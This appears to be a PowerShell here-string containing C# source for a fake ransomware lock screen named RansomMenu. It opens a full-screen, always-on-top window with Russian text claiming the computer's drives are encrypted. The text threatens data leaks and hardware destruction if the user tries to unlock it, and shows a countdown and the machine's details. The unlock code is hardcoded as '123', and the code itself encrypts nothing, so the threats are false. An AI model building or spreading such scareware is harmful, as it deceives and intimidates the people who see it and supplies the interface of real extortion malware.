$csharpCode = @"
using System;
using System.Drawing;
using System.Windows.Forms;

public class RansomMenu : Form
{
    private Label timerLabel;
    private TextBox inputBox;
    private Panel boxPanel;
    private Label sysInfo;

    public RansomMenu()
    {
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.BackColor = Color.Black;
        this.DoubleBuffered = true;

        // Таймер сверху справа
        timerLabel = new Label();
        timerLabel.Text = "До самоуничтожения:\n47:55:22";
        timerLabel.Font = new Font("Consolas", 14, FontStyle.Bold);
        timerLabel.ForeColor = Color.Magenta;
        timerLabel.BackColor = Color.Black;
        timerLabel.AutoSize = true;
        timerLabel.TextAlign = ContentAlignment.TopRight;
        this.Controls.Add(timerLabel);

        // Центральная панель
        boxPanel = new Panel();
        boxPanel.Size = new Size(800, 250);
        boxPanel.BackColor = Color.Black;
        boxPanel.BorderStyle = BorderStyle.None;
        this.Controls.Add(boxPanel);

        // Отрисовка розовой рамки
        boxPanel.Paint += (s, e) => {
            Pen p = new Pen(Color.Magenta, 2);
            e.Graphics.DrawRectangle(p, 0, 0, boxPanel.Width - 1, boxPanel.Height - 1);
            e.Graphics.DrawLine(p, 0, 160, boxPanel.Width, 160); // Линия над полем ввода
        };

        // Текст внутри рамки
        Label textLbl = new Label();
        textLbl.Text = "Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы\n" +
                       "вирусом-шифровальщиком. Любые действия, связанные с попыткой\n" +
                       "снятия блокировки нанесут непоправимый вред Вашему компьютеру и приведут к\n" +
                       "потере всех важных файлов без возможности их восстановления. При попытке снять\n" +
                       "блокировку все ваши данные будут отправлены в сеть и будет подана рекурсивная\n" +
                       "нагрузка на ваш процессор, что приведет к выходу его из строя.";
        textLbl.Font = new Font("Consolas", 10, FontStyle.Bold);
        textLbl.ForeColor = Color.White;
        textLbl.Location = new Point(10, 10);
        textLbl.Size = new Size(780, 140);
        boxPanel.Controls.Add(textLbl);

        // Текст над полем ввода
        Label inputLbl = new Label();
        inputLbl.Text = "Введите код разблокировки:";
        inputLbl.Font = new Font("Consolas", 12, FontStyle.Bold);
        inputLbl.ForeColor = Color.White;
        inputLbl.Location = new Point(10, 170);
        inputLbl.Size = new Size(300, 20);
        boxPanel.Controls.Add(inputLbl);

        // Поле ввода (Розовое, как на скрине)
        inputBox = new TextBox();
        inputBox.Font = new Font("Consolas", 14, FontStyle.Bold);
        inputBox.BackColor = Color.Magenta;
        inputBox.ForeColor = Color.Black;
        inputBox.BorderStyle = BorderStyle.None;
        inputBox.Location = new Point(10, 195);
        inputBox.Size = new Size(780, 30);
        inputBox.KeyDown += InputBox_KeyDown;
        boxPanel.Controls.Add(inputBox);

        // Инфо о системе слева снизу
        sysInfo = new Label();
        sysInfo.Text = "Current PC: " + Environment.MachineName + "\n" +
                       "Windows: " + Environment.OSVersion.VersionString + "\n" +
                       "IP: 192.168.1.x";
        sysInfo.Font = new Font("Consolas", 10);
        sysInfo.ForeColor = Color.DarkGray;
        sysInfo.AutoSize = true;
        this.Controls.Add(sysInfo);

        // Выравнивание при старте
        this.Resize += (s, e) => {
            timerLabel.Location = new Point(this.Width - 250, 20);
            boxPanel.Location = new Point((this.Width - boxPanel.Width) / 2, (this.Height - boxPanel.Height) / 2);
            sysInfo.Location = new Point(20, this.Height - 80);
        };
    }

    protected override void OnShown(EventArgs e)
    {
        base.OnShown(e);
        // Принудительно ставим фокус на поле ввода
        inputBox.Focus();
        this.ActiveControl = inputBox;
    }

    private void InputBox_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Enter)
        {
            if (inputBox.Text == "123")
            {
                this.Close(); // Выход
            }
            else
            {
                inputBox.Text = "";
                inputBox.BackColor = Color.Red;
                Timer t = new Timer();
                t.Interval = 500;
                t.Tick += (s, ev) => { inputBox.BackColor = Color.Magenta; t.Stop(); };
                t.Start();
            }
        }
    }
}
"@

